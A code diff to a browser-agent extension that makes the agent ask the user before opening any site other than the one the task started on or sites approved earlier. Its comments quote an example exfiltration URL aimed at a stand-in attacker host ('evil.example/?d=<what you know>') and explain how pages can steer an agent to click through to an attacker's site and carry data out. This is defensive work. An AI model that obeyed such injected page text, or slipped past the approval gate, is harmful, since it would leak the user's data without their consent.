@@ -340,11 +340,11 @@ export function createAgent({ getConfig, emit, readPage, closeConfirm = () => {}
       if (!url) return `Error: "${clip(a.url, 80)}" is not a web address I can open. Give a full http(s) URL, e.g. https://duckduckgo.com/?q=macbook+air+2024+part+number.`;
       // The model writes this URL itself, and the pages it has read can steer what it writes
       // ("open evil.example/?d=<what you know>"). So a NEW site needs the user's OK, showing the
-      // full URL; the tab's current site and any site approved earlier in this run go through.
-      let here = "";
-      try { here = siteOf((await browser.tabs.get(active.tabId)).url); } catch { /* tab gone: ask */ }
+      // full URL. Only the site the run STARTED on and sites approved earlier in this run go
+      // through — not wherever the tab is now: a page can make the agent click a link to the
+      // attacker's site, and from there a free navigate would carry the data out.
       const site = siteOf(url);
-      if (!sameSite(site, here) && ![...active.approvedSites].some((s) => sameSite(site, s))) {
+      if (![...active.approvedSites].some((s) => sameSite(site, s))) {
         const approved = await askConfirm(`Open a new site: ${site}?\n${clip(url, 300)}\n\nApproving lets the agent use ${site} for the rest of this task.`);
         if (!approved) return `User DECLINED opening ${site}. Do not retry it; work with the current site or finish and explain.`;
         active.approvedSites.add(site);
@@ -560,7 +560,7 @@ export function createAgent({ getConfig, emit, readPage, closeConfirm = () => {}
     active = {
       controller: new AbortController(), tabId: tab.id, pendingConfirm: null, requests: [], gatesInFlight: 0, patches: [],
       grounding: groundingModel === GROUNDING_SAME ? model : (groundingModel || null), pendingShot: null, shotIndices: [],
-      scriptMode: !!scriptMode, observed: false, approvedSites: new Set(),
+      scriptMode: !!scriptMode, observed: false, approvedSites: new Set(siteOf(tab.url) ? [siteOf(tab.url)] : []),
     };
     confirmChain = Promise.resolve();
     await clearMarkers(tab.id); // start clean — any ring still on the page belongs to an older task
